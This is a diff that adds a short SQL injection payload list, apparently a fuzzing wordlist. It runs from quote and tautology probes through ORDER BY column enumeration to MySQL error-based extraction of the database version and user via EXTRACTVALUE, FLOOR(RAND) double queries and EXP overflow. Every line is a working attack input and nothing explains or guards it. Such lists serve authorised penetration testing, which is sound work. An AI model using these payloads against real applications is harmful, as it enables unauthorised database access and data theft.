@@ -1,0 +1,13 @@
+'
+''
+`
+"
+' OR '1'='1
+' OR 1=1--
+' OR 1=1#
+1' ORDER BY 1--
+1' ORDER BY 2--
+1' ORDER BY 3--
+' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--
+' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
+1 AND EXP(~(SELECT * FROM (SELECT USER()) x))--
